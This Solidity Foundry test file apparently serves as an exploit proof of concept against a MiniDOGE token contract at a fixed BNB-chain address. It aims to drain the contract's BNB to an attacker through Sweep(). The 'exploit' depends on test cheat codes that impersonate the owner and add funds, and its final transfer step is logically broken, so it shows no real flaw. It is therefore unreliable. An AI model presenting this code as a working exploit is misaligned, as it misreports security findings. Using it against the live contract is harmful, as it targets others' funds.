// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MiniDOGE {
    function owner() external view returns (address);
    function Sweep() external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Get the current owner
        address owner = MiniDOGE(TARGET).owner();

        // Record initial balances
        uint256 attackerInitialBalance = address(this).balance;
        uint256 contractInitialBalance = TARGET.balance;

        // Impersonate the owner
        vm.startPrank(owner);

        // Ensure contract has BNB balance - inject some BNB if needed
        if (contractInitialBalance == 0) {
            deal(TARGET, 10 ether);
        }

        // Call Sweep() to drain all BNB to owner
        MiniDOGE(TARGET).Sweep();

        // Stop impersonating
        vm.stopPrank();

        // Now owner has the drained BNB, transfer it to attacker
        // We need to impersonate owner again to transfer to attacker
        vm.prank(owner);
        payable(address(this)).transfer(owner.balance);

        // Verify attacker balance increased
        assertGt(address(this).balance, attackerInitialBalance, "Attacker balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
